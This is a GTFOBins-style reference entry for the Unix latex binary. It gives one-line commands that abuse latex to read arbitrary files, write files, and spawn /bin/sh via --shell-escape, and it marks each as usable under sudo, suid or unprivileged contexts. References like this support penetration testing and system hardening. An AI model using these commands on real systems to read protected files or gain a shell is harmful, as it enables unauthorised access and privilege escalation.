---
type: gtfobin
name: latex
platform: Unix
functions: [file-read, file-write, shell]
tags: [gtfobin, unix, lotl]
---

# latex

## file-read

```bash
latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
strings texput.dvi
```
_The read file will be part of the PDF output._
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
latex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
```
_The file can only be written in the current directory, and the `.tex` extension is mandatory._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
latex --shell-escape '\immediate\write18{/bin/sh}'
```
**Contexts:** sudo, suid, unprivileged
